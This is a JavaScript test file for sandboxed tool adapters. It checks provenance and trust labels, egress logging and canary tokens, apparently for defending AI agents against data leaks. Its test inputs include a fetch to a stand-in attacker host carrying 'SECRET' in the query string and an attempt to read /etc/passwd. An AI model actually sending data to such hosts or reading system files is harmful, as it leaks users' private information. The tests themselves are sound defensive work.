import { test } from 'node:test';
import assert from 'node:assert/strict';
import { ProvenanceStore } from '../../src/core/labels/index.js';
import { createFakeTools, ToolError } from '../../src/core/tools/adapters.js';
import { createWorld } from '../../src/core/tools/world.js';
import { seedFixtures } from '../../src/core/tools/fixtures/seed.js';

const fresh = () => {
  const world = createWorld(seedFixtures);
  const tools = createFakeTools(world);
  const store = new ProvenanceStore();
  const run = (tool, args) => store.fromTool(tools[tool](args), { tool });
  return { world, tools, store, run };
};

test('contacts: trusted and public, found by name or address, case-insensitively', () => {
  const { run, store } = fresh();
  const alice = run('lookup_contact', { name: 'alice' });
  const email = store.field(alice, 'email');
  assert.equal(email.data, 'alice@example.com');
  assert.equal(email.label.integrity, 'trusted');
  assert.equal(email.label.readers.kind, 'public');
  assert.deepEqual(email.label.sources, ['contacts']);
  assert.equal(run('lookup_contact', { name: 'ALICE@example.com' }).data.name, 'Alice');
});

test('contacts: unknown names are an error, not a guess', () => {
  const { tools } = fresh();
  assert.throws(() => tools.lookup_contact({ name: 'Mallory' }), ToolError);
});

test('email: the body is untrusted and private; the sender is untrusted but public', () => {
  const { run, store } = fresh();
  const mail = run('read_email', { from: 'Bob' });
  const body = store.field(mail, 'body');
  const from = store.field(mail, 'from');
  assert.equal(body.label.integrity, 'untrusted');
  assert.deepEqual(body.label.readers.principals, [], 'visible to the user only');
  assert.equal(from.label.integrity, 'untrusted', 'headers can be spoofed');
  assert.equal(from.label.readers.kind, 'public');
  assert.deepEqual(body.label.sources, ['email:msg-2']);
});

test('email: "latest" returns the most recent; "all" returns a list with labels per item', () => {
  const { run, store } = fresh();
  assert.equal(store.field(run('read_email', { from: 'bob@example.com' }), 'id').data, 'msg-2');
  const all = run('read_email', { from: 'Bob', which: 'all' });
  assert.deepEqual(
    store.items(all).map((m) => store.field(m, 'id').data),
    ['msg-2', 'msg-1'],
  );
  assert.equal(all.label.integrity, 'untrusted');
});

test('email: no mail from that sender is an error', () => {
  assert.throws(() => fresh().tools.read_email({ from: 'Nobody' }), /No email from/);
});

test('send_email: validates the address, records the mail and the egress', () => {
  const { tools, world } = fresh();
  tools.send_email({ to: 'alice@example.com', subject: 'Hi', body: 'Hello' });
  assert.deepEqual(world.outbox, [{ to: 'alice@example.com', subject: 'Hi', body: 'Hello' }]);
  assert.deepEqual(
    world.egress.map((e) => [e.kind, e.target]),
    [['email', 'alice@example.com']],
  );
  for (const to of ['not an address', 'a@b', '', 'x@y.z, w@v.u', '<a@b.co>']) {
    assert.throws(() => tools.send_email({ to, subject: 's', body: 'b' }), ToolError, to);
  }
  assert.equal(world.outbox.length, 1, 'invalid sends leave nothing behind');
});

test('files: private files are readable by the user only; the fixture decides trust', () => {
  const { run } = fresh();
  const contract = run('read_file', { path: 'contract.pdf' });
  assert.equal(contract.label.integrity, 'untrusted');
  assert.deepEqual(contract.label.readers.principals, []);
  assert.deepEqual(contract.label.sources, ['file:contract.pdf']);
  const brief = run('read_file', { path: 'brief.txt' });
  assert.equal(brief.label.readers.kind, 'public');
  const notes = run('read_file', { path: 'notes.txt' });
  assert.equal(notes.label.integrity, 'trusted');
  assert.equal(notes.label.readers.kind, 'restricted');
});

test('files: a missing file is an error; delete removes it and is recorded', () => {
  const { tools, world } = fresh();
  assert.throws(() => tools.read_file({ path: 'nope.txt' }), /No such file/);
  tools.delete_file({ path: 'notes.txt' });
  assert.throws(() => tools.read_file({ path: 'notes.txt' }), /No such file/);
  assert.deepEqual(world.egress.at(-1), { kind: 'delete', target: 'notes.txt' });
  assert.throws(() => tools.delete_file({ path: 'notes.txt' }), /No such file/);
});

test('web: pages are untrusted and public; every fetch is recorded as leaving the machine', () => {
  const { run, tools, world } = fresh();
  const page = run('fetch_url', { url: 'https://example.org/post' });
  assert.equal(page.label.integrity, 'untrusted');
  assert.equal(page.label.readers.kind, 'public');
  assert.throws(() => tools.fetch_url({ url: 'https://evil.example/?q=SECRET' }), /404/);
  assert.deepEqual(
    world.egress.map((e) => e.target),
    ['https://example.org/post', 'https://evil.example/?q=SECRET'],
  );
  assert.throws(() => tools.fetch_url({ url: 'file:///etc/passwd' }), ToolError);
});

test('adapters reject unexpected or malformed arguments', () => {
  const { tools } = fresh();
  assert.throws(() => tools.lookup_contact({ name: 'Alice', extra: 1 }), ToolError);
  assert.throws(() => tools.read_file({ path: 42 }), ToolError);
  assert.throws(() => tools.read_email({ from: 'Bob', which: 'everything' }), ToolError);
  assert.throws(() => tools.send_email({ to: 'a@b.co' }), ToolError);
});

test('worlds are independent and never change the shared fixtures', () => {
  const a = createWorld(seedFixtures);
  const b = createWorld(seedFixtures);
  createFakeTools(a).delete_file({ path: 'contract.pdf' });
  createFakeTools(a).send_email({ to: 'x@y.zz', subject: 's', body: 'b' });
  assert.equal(b.files.has('contract.pdf'), true);
  assert.equal(b.outbox.length, 0);
  assert.equal(seedFixtures.files.length, 3);
});

test('the seed dataset has a recognisable canary in every private file', () => {
  for (const f of seedFixtures.files.filter((x) => x.confidentiality === 'private')) {
    assert.match(f.content, /CANARY-[A-Z]+-\d+/, f.path);
  }
});

test('malformed fixtures are rejected', () => {
  assert.throws(() => createWorld({ contacts: [], emails: [], files: [{ path: 'a' }], pages: [] }));
  assert.throws(() => createWorld(null));
});

test('tool error messages never quote the argument that caused them', () => {
  const { tools } = fresh();
  const secret = 'SECRET-ARGUMENT-TEXT';
  const attempts = [
    () => tools.lookup_contact({ name: secret }),
    () => tools.read_email({ from: secret }),
    () => tools.read_file({ path: secret }),
    () => tools.delete_file({ path: secret }),
    () => tools.fetch_url({ url: `https://example.org/${secret}` }),
    () => tools.send_email({ to: secret, subject: 's', body: 'b' }),
  ];
  for (const attempt of attempts) {
    assert.throws(
      attempt,
      (err) => err instanceof ToolError && !err.message.includes(secret),
      String(attempt),
    );
  }
});
